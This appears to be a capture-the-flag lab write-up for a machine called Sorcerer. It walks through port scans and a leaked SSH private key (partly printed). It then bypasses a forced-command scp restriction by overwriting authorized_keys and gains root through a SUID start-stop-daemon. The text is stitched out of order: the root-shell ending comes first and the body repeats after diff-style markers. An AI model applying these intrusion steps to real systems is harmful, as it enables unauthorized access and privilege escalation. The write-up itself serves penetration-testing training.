&nbsp; &nbsp; <span class="cm-number">114784</span> Jun <span class="cm-number">24</span> &nbsp;<span class="cm-number">2020</span> /usr/sbin/mount.nfs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">131537</span> &nbsp; &nbsp; <span class="cm-number">44</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">44200</span> Jun &nbsp;<span class="cm-number">3</span> &nbsp;<span class="cm-number">2019</span> /usr/sbin/start-stop-daemon</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">131139</span> &nbsp; &nbsp; <span class="cm-number">64</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">63736</span> Jul <span class="cm-number">27</span> &nbsp;<span class="cm-number">2018</span> /usr/bin/passwd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">164794</span> &nbsp; &nbsp; <span class="cm-number">36</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">34896</span> Apr <span class="cm-number">22</span> &nbsp;<span class="cm-number">2020</span> /usr/bin/fusermount</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">134752</span> &nbsp; &nbsp; <span class="cm-number">64</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">63568</span> Jan <span class="cm-number">10</span> &nbsp;<span class="cm-number">2019</span> /usr/bin/su</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">135086</span> &nbsp; &nbsp; <span class="cm-number">52</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">51280</span> Jan <span class="cm-number">10</span> &nbsp;<span class="cm-number">2019</span> /usr/bin/mount</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">166426</span> &nbsp; &nbsp; <span class="cm-number">16</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">14664</span> Oct &nbsp;<span class="cm-number">9</span> &nbsp;<span class="cm-number">2019</span> /usr/bin/vmware-user-suid-wrapper</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">134605</span> &nbsp; &nbsp; <span class="cm-number">44</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">44440</span> Jul <span class="cm-number">27</span> &nbsp;<span class="cm-number">2018</span> /usr/bin/newgrp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">131134</span> &nbsp; &nbsp; <span class="cm-number">56</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">54096</span> Jul <span class="cm-number">27</span> &nbsp;<span class="cm-number">2018</span> /usr/bin/chfn</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">135088</span> &nbsp; &nbsp; <span class="cm-number">36</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">34888</span> Jan <span class="cm-number">10</span> &nbsp;<span class="cm-number">2019</span> /usr/bin/umount</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">131137</span> &nbsp; &nbsp; <span class="cm-number">84</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">84016</span> Jul <span class="cm-number">27</span> &nbsp;<span class="cm-number">2018</span> /usr/bin/gpasswd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">131135</span> &nbsp; &nbsp; <span class="cm-number">44</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">44528</span> Jul <span class="cm-number">27</span> &nbsp;<span class="cm-number">2018</span> /usr/bin/chsh</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-number">938</span> &nbsp; &nbsp; <span class="cm-number">12</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-number">10232</span> Mar <span class="cm-number">28</span> &nbsp;<span class="cm-number">2017</span> /usr/lib/eject/dmcrypt-get-device</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">152206</span> &nbsp; &nbsp;<span class="cm-number">428</span> <span class="cm-attribute">-rwsr-xr-x</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; root &nbsp; &nbsp; &nbsp; <span class="cm-number">436552</span> Jan <span class="cm-number">31</span> &nbsp;<span class="cm-number">2020</span> /usr/lib/openssh/ssh-keysign</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; <span class="cm-number">148810</span> &nbsp; &nbsp; <span class="cm-number">52</span> <span class="cm-attribute">-rwsr-xr--</span> &nbsp; <span class="cm-number">1</span> root &nbsp; &nbsp; messagebus &nbsp; &nbsp;<span class="cm-number">51184</span> Jul &nbsp;<span class="cm-number">5</span> &nbsp;<span class="cm-number">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 351px;"></div><div class="CodeMirror-gutters" style="display: none; height: 351px;"></div></div></div></pre><p><code>GTFObins</code><span> confirms it could be an attack vector for privesc.</span></p><p><img src="./sorcerer.assets/image-20260128232001510.png" alt="image-20260128232001510"></p><h1 id='shell-as-root'><span>Shell as </span><code>root</code></h1><p><span>Take a look at the </span><code>euid</code><span> , I’m root!</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">max@sorcerer:/tmp<span class="cm-def">$ </span>/usr/sbin/start-stop-daemon <span class="cm-attribute">-n</span> <span class="cm-def">$RANDOM</span> <span class="cm-attribute">-S</span> <span class="cm-attribute">-x</span> /bin/bash <span class="cm-attribute">--</span> <span class="cm-attribute">-p</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bash-5.0<span class="cm-comment"># whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bash-5.0<span class="cm-comment"># id</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-def">uid</span><span class="cm-operator">=</span><span class="cm-number">1003</span>(max) <span class="cm-def">gid</span><span class="cm-operator">=</span><span class="cm-number">1003</span>(max) <span class="cm-def">euid</span><span class="cm-operator">=</span><span class="cm-number">0</span>(root) <span class="cm-def">groups</span><span class="cm-operator">=</span><span class="cm-number">1003</span>(max)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 110px;"></div><div class="CodeMirror-gutters" style="display: none; height: 110px;"></div></div></div></pre><p><span>Found </span><code>proof.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bash-5.0<span class="cm-comment"># ls</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">proof.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bash-5.0<span class="cm-comment"># cat proof.txt</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4cfd5...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre></div></div>
+<body>
+<a class="home-link" href="../../../index.html">🏠 Home</a>
+<div class="page">
+<div class="byline">Write-up by wook413</div>
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a href="#initial-access">Initial Access</a><ul>
+<li><a href="#http-80-7742-8080">HTTP 80 7742 8080</a></li>
+<li><a href="#http-7742">HTTP 7742</a></li>
+</ul>
+</li>
+<li><a href="#shell-as-max">Shell as max</a></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+<li><a href="#shell-as-root">Shell as root</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<p>As always, I kicked off the machine with scanning all 65,535 TCP ports.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-14 01:55 UTC
+Nmap scan report for 192.168.189.100
+Host is up (0.046s latency).
+Not shown: 65525 closed tcp ports (reset)
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+7742/tcp  open  msss
+8080/tcp  open  http-proxy
+37299/tcp open  unknown
+43301/tcp open  unknown
+44355/tcp open  unknown
+45643/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
+</code></pre>
+<p>Then I ran one more TCP scan but this time only on the discovered ports with <code>-sC</code> and <code>-sV</code> flags.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sC -sV -p 22,80,111,2049,7742,8080,37299,43301,44355,45643
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-14 01:56 UTC
+Nmap scan report for 192.168.189.100
+Host is up (0.045s latency).
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
+|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
+|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
+80/tcp    open  http     nginx
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100003  3           2049/udp   nfs
+|   100003  3,4         2049/tcp   nfs
+|   100005  1,2,3      40470/udp   mountd
+|   100005  1,2,3      44355/tcp   mountd
+|   100021  1,3,4      43301/tcp   nlockmgr
+|   100021  1,3,4      51802/udp   nlockmgr
+|   100227  3           2049/tcp   nfs_acl
+|_  100227  3           2049/udp   nfs_acl
+2049/tcp  open  nfs      3-4 (RPC #100003)
+7742/tcp  open  http     nginx
+|_http-title: SORCERER
+8080/tcp  open  http     Apache Tomcat 7.0.4
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/7.0.4
+37299/tcp open  mountd   1-3 (RPC #100005)
+43301/tcp open  nlockmgr 1-4 (RPC #100021)
+44355/tcp open  mountd   1-3 (RPC #100005)
+45643/tcp open  mountd   1-3 (RPC #100005)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 13.68 seconds
+</code></pre>
+<p>Finally, I performed a UDP port scan on the top 10 ports.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sU --top-ports 10                                         
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-14 01:57 UTC
+Nmap scan report for 192.168.189.100
+Host is up (0.046s latency).
+
+PORT     STATE         SERVICE
+53/udp   closed        domain
+67/udp   open|filtered dhcps
+123/udp  closed        ntp
+135/udp  closed        msrpc
+137/udp  closed        netbios-ns
+138/udp  closed        netbios-dgm
+161/udp  closed        snmp
+445/udp  closed        microsoft-ds
+631/udp  closed        ipp
+1434/udp closed        ms-sql-m
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+</code></pre>
+<h1 id="initial-access">Initial Access</h1>
+<h2 id="http-80-7742-8080">HTTP 80 7742 8080</h2>
+<p>Before going in-depth for enumeration, I like to run <code>http-enum</code> script on the ports running HTTP. As you can see from the output, two directories were found on port 7742.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP --script http-enum -sV -p 80,7742,8080               
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-14 02:02 UTC
+Nmap scan report for 192.168.189.100
+Host is up (0.045s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    nginx
+7742/tcp open  http    nginx
+| http-enum: 
+|   /default/: Potentially interesting folder
+|_  /zipfiles/: Potentially interesting folder w/ directory listing
+8080/tcp open  http    Apache Tomcat 7.0.4
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 124.40 seconds
+</code></pre>
+<h2 id="http-7742">HTTP 7742</h2>
+<p><img alt="image-20260128231919427" src="./sorcerer.assets/image-20260128231919427.png" /></p>
+<p>Navigating to <code>/zipfiles</code> in the browser, I see four <code>.zip</code> files are being hosted.</p>
+<p><img alt="image-20260128231927804" src="./sorcerer.assets/image-20260128231927804.png" /></p>
+<p>Downloaded all of the files locally.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads]
+└─$ ls -la
+total 32
+drwxr-xr-x  2 kali kali 4096 Jan 14 02:16 .
+drwx------ 33 kali kali 4096 Jan 14 02:06 ..
+-rw-rw-r--  1 kali kali 2834 Jan 14 02:14 francis.zip
+-rw-rw-r--  1 kali kali 8274 Sep 24  2020 max.zip
+-rw-rw-r--  1 kali kali 2826 Sep 24  2020 miriam.zip
+-rw-rw-r--  1 kali kali 2818 Sep 24  2020 sofia.zip
+</code></pre>
+<p>Using <code>unzip -l</code> , I inspected the contents of <code>max.zip</code> without extracting it and identified a SSH private key, and a backup file, <code>tomcat-users.xml.bak</code> , containing credentials.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads]
+└─$ unzip -l &quot;*.zip&quot;
+Archive:  francis.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2020-09-24 19:27   home/francis/
+      220  2019-04-18 04:12   home/francis/.bash_logout
+      807  2019-04-18 04:12   home/francis/.profile
+     3526  2019-04-18 04:12   home/francis/.bashrc
+---------                     -------
+     4553                     4 files
+
+Archive:  sofia.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2020-09-24 19:27   home/sofia/
+      220  2019-04-18 04:12   home/sofia/.bash_logout
+      807  2019-04-18 04:12   home/sofia/.profile
+     3526  2019-04-18 04:12   home/sofia/.bashrc
+---------                     -------
+     4553                     4 files
+
+Archive:  miriam.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2020-09-24 19:27   home/miriam/
+      220  2019-04-18 04:12   home/miriam/.bash_logout
+      807  2019-04-18 04:12   home/miriam/.profile
+     3526  2019-04-18 04:12   home/miriam/.bashrc
+---------                     -------
+     4553                     4 files
+
+Archive:  max.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+        0  2020-09-24 19:27   home/max/
+      220  2019-04-18 04:12   home/max/.bash_logout
+      807  2019-04-18 04:12   home/max/.profile
+        0  2020-09-24 19:27   home/max/.ssh/
+      738  2020-09-24 19:27   home/max/.ssh/id_rsa.pub
+      836  2020-09-24 19:27   home/max/.ssh/authorized_keys
+     3381  2020-09-24 19:27   home/max/.ssh/id_rsa
+     1991  2020-09-24 19:27   home/max/tomcat-users.xml.bak
+     3526  2019-04-18 04:12   home/max/.bashrc
+      133  2020-09-24 19:27   home/max/scp_wrapper.sh
+---------                     -------
+    11632                     10 files
+
+4 archives were successfully processed.
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]
+└─$ cat id_rsa       
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAgEAt/bdQL2FWSqIZy8+sfdp19nLsDMrirNKlDFvT2vs6WZNoW/2bFCw
+SkIBbiE1bWoSYrKan0WPpKhfESuk69Lw3Aj+I2wo2nSd5n2Phua7C2xn3pN72/XayZCdPp
+QZvPzhIU4cFhY5HWrNqASRfMUoOHcUuowvMLJ+5Qfi98UkuwPOEZ4V10BhoYxjXxunqTwf
+...
+...
+</code></pre>
+<p><img alt="image-20260128231938513" src="./sorcerer.assets/image-20260128231938513.png" /></p>
+<p>Although I had obtained a private key, my SSH login attempts were repeatedly denied, instead returning the scp usage help page.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i id_rsa max@$IP
+The authenticity of host '192.168.189.100 (192.168.189.100)' can't be established.
+ED25519 key fingerprint is SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N+4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.189.100' (ED25519) to the list of known hosts.
+PTY allocation request failed on channel 0
+ACCESS DENIED.
+usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
+           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
+Connection to 192.168.189.100 closed.
+</code></pre>
+<p>Investigation of <code>scp_wrapper.sh</code> revealed a restricted shell environment that explicitly forces the use of <code>scp</code> .</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads/home/max]
+└─$ cat scp_wrapper.sh      
+#!/bin/bash
+case $SSH_ORIGINAL_COMMAND in
+ 'scp'*)
+    $SSH_ORIGINAL_COMMAND
+    ;;
+ *)
+    echo &quot;ACCESS DENIED.&quot;
+    scp
+    ;;
+esac       
+</code></pre>
+<p>To bypass this, I audited the <code>authorized_keys</code> file and removed the <code>command=</code> prefix that was forcing the wrapper script.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]
+└─$ cat authorized_keys     
+no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command=&quot;/home/max/scp_wrapper.sh&quot; ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Downloads/home/max/.ssh]
+└─$ cat id_rsa.pub     
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
+</code></pre>
+<p>All of the prefix is removed.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/.ssh]
+└─$ cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer
+</code></pre>
+<p>However, the connection still failed with an error.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/.ssh]
+└─$ scp -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
+scp: Received message too long 1094927173
+scp: Ensure the remote shell produces no output for non-interactive sessions.
+</code></pre>
+<p>I pulled up the man page of <code>scp</code> and found the following option: <code>-O</code> . This option allows you to use the legacy SCP protocol for file transfers instead of the SFTP protocol. Let’s give this a try.</p>
+<p><img alt="image-20260128231951392" src="./sorcerer.assets/image-20260128231951392.png" /></p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/.ssh]
+└─$ scp -O -i id_rsa authorized_keys max@$IP:/home/max/.ssh/authorized_keys
+authorized_keys                                                                                         100%  836    17.5KB/s   00:00    
+</code></pre>
+<h1 id="shell-as-max">Shell as <code>max</code></h1>
+<p>I finally was able to authenticate in.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/.ssh]
+└─$ ssh -i id_rsa max@$IP                                                  
+max@sorcerer:~$ whoami
+max
+</code></pre>
+<p>Found <code>local.txt</code> in <code>/home/dennis</code></p>
+<pre><code class="language-bash">max@sorcerer:/home$ cd /home
+max@sorcerer:/home$ ls -aR
+.:
+.  ..  dennis  francis  max  miriam  sofia
+
+./dennis:
+.  ..  .bash_logout  .bashrc  local.txt  .profile
+
+./francis:
+.  ..  .bash_logout  .bashrc  .profile
+
+./max:
+.  ..  .bash_logout  .bashrc  .profile  scp_wrapper.sh  .ssh  tomcat-users.xml.bak
+
+./max/.ssh:
+.  ..  authorized_keys  id_rsa  id_rsa.pub
+
+./miriam:
+.  ..  .bash_logout  .bashrc  .profile
+
+./sofia:
+.  ..  .bash_logout  .bashrc  .profile
+</code></pre>
+<pre><code class="language-bash">max@sorcerer:/home/dennis$ cat local.txt
+c86a...
+</code></pre>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p><code>start-stop-daemon</code> has a SUID bit set to its binary, which is very unusual.</p>
+<pre><code class="language-bash">max@sorcerer:/tmp$ find / -type f -perm -4000 -ls 2&gt;/dev/null
+   166328    116 -rwsr-xr-x   1 root     root       114784 Jun 24  2020 /usr/sbin/mount.nfs
+   131537     44 -rwsr-xr-x   1 root     root        44200 Jun  3  2019 /usr/sbin/start-stop-daemon
+   131139     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd
+   164794     36 -rwsr-xr-x   1 root     root        34896 Apr 22  2020 /usr/bin/fusermount
+   134752     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su
+   135086     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount
